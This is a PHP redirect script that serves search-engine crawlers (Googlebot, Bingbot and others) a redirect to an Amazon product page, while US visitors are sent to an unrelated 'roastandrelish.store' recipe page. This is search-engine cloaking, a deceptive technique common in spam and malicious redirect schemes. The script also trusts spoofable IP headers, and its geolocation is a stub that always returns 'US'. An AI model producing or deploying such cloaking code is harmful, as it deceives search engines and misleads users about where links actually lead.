<?php
// Function to get user's IP address
function getUserIP() {
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Function to get location from IP (You can use a service like IPinfo, GeoIP2, etc.)
function getLocationFromIP($ip) {
    // Example: Mock function to simulate location
    // Replace with actual IP-to-location service
    return 'US';  // Mock return value, replace with actual implementation
}

// Get user's IP and location
$userIP = getUserIP();
$userLocation = getLocationFromIP($userIP);

// Check user agent for bots, crawlers, spiders
$bots = ['Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'YandexBot'];
$isBot = false;
foreach ($bots as $bot) {
    if (stripos($_SERVER['HTTP_USER_AGENT'], $bot) !== false) {
        $isBot = true;
        break;
    }
}

// Redirect logic
if ($isBot) {
    header('Location: https://www.amazon.com/Simple-Joys-Carters-Short-Sleeve-Bodysuit/dp/B07GY1RRZF');
    exit();
} else if ($userLocation === 'US') {
    header('Location: https://roastandrelish.store/honey-chicken-recipe-french');
    exit();
} else {
    // Default redirection or content
    echo 'Welcome to our website!';
}
?>
